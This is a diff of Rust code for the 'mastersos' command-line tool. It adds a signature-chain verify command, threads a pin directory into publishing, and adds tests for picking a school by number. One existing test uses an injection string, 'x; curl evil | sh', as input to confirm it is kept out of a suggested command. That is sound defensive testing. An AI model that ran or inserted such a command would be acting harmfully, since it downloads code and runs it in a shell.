+            json!({"pulled": true, "version": n, "dir": abs.display().to_string(), "server": origin, "school_id": school})
+        ));
+    }
+    Ok(format!("Pulled version {n} into {}.\n", dir.display()))
+}
+
+/// `mastersos verify [--school UUID] [--server URL]` (default: the current directory's
+/// mastersos.toml).
+async fn verify_v1(
+    o: &V1,
+    school: Option<&str>,
+    confirm: &mut dyn std::io::BufRead,
+    out: &mut dyn std::io::Write,
+) -> Result<String, CliError> {
+    let meta = dir_meta(Path::new("."))?;
+    let school = school_of(school, meta.as_ref())?;
+    let (creds, origin) = resolve_v1(o, meta.as_ref()).await?;
+    let server = Server::new(&origin, Some(&school), creds)?;
+    let pins = resolve_pin_dir(o.pin_flag.as_deref())?;
+    let v = crate::sign::chain::verify_chain((&server).into(), &pins, &o.anchors(), confirm, out)
+        .await?;
+    if o.json {
+        let trust: Vec<serde_json::Value> = v
+            .trust
+            .iter()
+            .map(|k| json!({"key_id": k.id, "fingerprint": mastersos_bundle::trust_fingerprint(k)}))
+            .collect();
+        return Ok(format!(
+            "{}\n",
+            json!({"version": v.version, "latest": v.latest, "trust": trust})
+        ));
+    }
+    let mut s = if v.latest != v.version {
+        format!(
+            "Verified up to version {}; computers accept up to version {}. Its trusted keys:\n",
+            v.latest, v.version
+        )
+    } else {
+        format!("Verified up to version {}. Trusted keys:\n", v.version)
+    };
+    for k in &v.trust {
+        s.push_str(&format!("    {}\n", crate::sign::key_line(k)));
+    }
+    Ok(s)
 }
 
 /// Issues for people: one per line (level, code, where, message), then a count.
@@ -1816,24 +2125,25 @@ fn prompt_secret(text: &str) -> Result<zeroize::Zeroizing<String>, OpError> {
 }
 
 /// `mastersos publish`.
+#[allow(clippy::too_many_arguments)] // until publish moves to protocol v1 (Task 6)
 async fn publish_dir(
     api: &Api,
     server: &str,
     token_file: &Path,
     dir: Option<&Path>,
+    pins: &Path,
     key: SignWith,
     allow_reroute: &[String],
     json: bool,
 ) -> Result<ExitCode, OpError> {
-    let w = open_dir(dir)?;
-    let pins = pin_dir()?;
+    let w = open_dir(dir, pins)?;
     publish_to(
         api,
         server,
         &PublishArgs {
             w: &w,
             token_file,
-            pins: &pins,
+            pins,
             key: &key,
             allow_reroute,
             json,
@@ -1988,8 +2298,9 @@ mod tests {
 
     #[test]
     fn pin_dir_is_a_global_option() {
-        let cli = Cli::try_parse_from(["mastersos", "verify", "--pin-dir", "/p"]).unwrap();
+        let cli = Cli::try_parse_from(["mastersos", "verify", "--pin-dir", "/p", "--yes"]).unwrap();
         assert_eq!(cli.pin_dir, Some(PathBuf::from("/p")));
+        assert!(cli.yes);
         let cli =
             Cli::try_parse_from(["mastersos", "--pin-dir", "/q", "seed", "check", "f"]).unwrap();
         assert_eq!(cli.pin_dir, Some(PathBuf::from("/q")));
@@ -2012,6 +2323,53 @@ mod tests {
         // A name that is not a-z, 0-9, - is never put into the suggested command.
         assert!(reroute_notice(&[lint("x; curl evil | sh")]).is_none());
         assert!(reroute_notice(&[lint("Upper")]).is_none());
+    }
+
+    #[test]
+    fn several_schools_are_asked_by_number_or_listed() {
+        let entry = |id: &str, name: &str| SchoolEntry {
+            id: id.into(),
+            name: name.into(),
+            time_zone: "UTC".into(),
+        };
+        let list = || {
+            vec![
+                entry("0192f3a4-5b6c-7d8e-9f00-112233445566", "Alpha"),
+                entry("0192f3a4-5b6c-7d8e-9f00-aabbccddeeff", "Beta\u{1b}[31m"),
+            ]
+        };
+        let mut out = Vec::new();
+        let s = choose_school(list(), true, &mut "2\n".as_bytes(), &mut out).unwrap();
+        assert_eq!(s.id, "0192f3a4-5b6c-7d8e-9f00-aabbccddeeff");
+        let shown = String::from_utf8(out).unwrap();
+        assert!(
+            shown.contains("1. 0192f3a4-5b6c-7d8e-9f00-112233445566  Alpha"),
+            "{shown}"
+        );
+        assert!(!shown.contains('\u{1b}'), "{shown:?}");
+        for typed in ["3\n", "x\n", ""] {
+            let e =
+                choose_school(list(), true, &mut typed.as_bytes(), &mut Vec::new()).unwrap_err();
+            assert!(
+                ["usage", "cancelled"].contains(&e.code.as_str()),
+                "{typed:?}"
+            );
+        }
+        // Nobody to ask: a usage error listing every id and name; nothing is read.
+        let e = choose_school(list(), false, &mut "1\n".as_bytes(), &mut Vec::new()).unwrap_err();
+        assert_eq!(e.code, "usage");
+        assert_eq!(e.problems.len(), 2);
+        assert!(e.problems[0].as_str().unwrap().contains("Alpha"));
+        let e = choose_school(Vec::new(), true, &mut "".as_bytes(), &mut Vec::new()).unwrap_err();
+        assert_eq!(e.code, "not_configured");
+        let one = choose_school(
+            vec![entry("0192f3a4-5b6c-7d8e-9f00-112233445566", "Alpha")],
+            false,
+            &mut "".as_bytes(),
+            &mut Vec::new(),
+        )
+        .unwrap();
+        assert_eq!(one.name, "Alpha");
     }
 
     #[test]
